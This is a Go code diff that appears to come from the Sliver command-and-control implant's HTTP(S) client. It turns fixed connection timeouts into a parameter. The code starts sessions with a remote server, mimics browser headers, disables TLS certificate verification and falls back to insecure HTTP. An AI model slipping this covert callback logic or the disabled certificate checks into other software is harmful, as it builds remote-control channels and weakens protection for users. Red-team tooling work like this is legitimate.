@@ -52,16 +52,14 @@ import (
 
 const (
 	userAgent         = "{{GenerateUserAgent}}"
-	defaultNetTimeout = time.Second * 60
-	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
 )
 
 // HTTPStartSession - Attempts to start a session with a given address
-func HTTPStartSession(address string, pathPrefix string, proxyConfig string) (*SliverHTTPClient, error) {
+func HTTPStartSession(address string, pathPrefix string, timeout time.Duration, proxyConfig string) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address, proxyConfig)
+	client = httpsClient(address, timeout, proxyConfig)
 	client.PathPrefix = pathPrefix
 	err := client.SessionInit()
 	if err != nil {
@@ -69,7 +67,7 @@ func HTTPStartSession(address string, pathPrefix string, proxyConfig string) (*S
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address, proxyConfig) // Fallback to insecure HTTP
+		client = httpClient(address, timeout, proxyConfig) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
@@ -456,17 +454,17 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
-func httpClient(address string, proxyConfig string) *SliverHTTPClient {
+func httpClient(address string, timeout time.Duration, proxyConfig string) *SliverHTTPClient {
 	transport := &http.Transport{
 		Dial:                proxy.Direct.Dial,
-		TLSHandshakeTimeout: defaultNetTimeout,
+		TLSHandshakeTimeout: timeout,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("http://%s", address),
 		Client: &http.Client{
 			Jar:       cookieJar(),
-			Timeout:   defaultReqTimeout,
+			Timeout:   timeout,
 			Transport: transport,
 		},
 	}
@@ -474,19 +472,19 @@ func httpClient(address string, proxyConfig string) *SliverHTTPClient {
 	return client
 }
 
-func httpsClient(address string, proxyConfig string) *SliverHTTPClient {
+func httpsClient(address string, timeout time.Duration, proxyConfig string) *SliverHTTPClient {
 	transport := &http.Transport{
 		Dial: (&net.Dialer{
-			Timeout: defaultNetTimeout,
+			Timeout: timeout,
 		}).Dial,
-		TLSHandshakeTimeout: defaultNetTimeout,
+		TLSHandshakeTimeout: timeout,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
 	}
 	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
 		Client: &http.Client{
 			Jar:       cookieJar(),
-			Timeout:   defaultReqTimeout,
+			Timeout:   timeout,
 			Transport: transport,
 		},
 	}
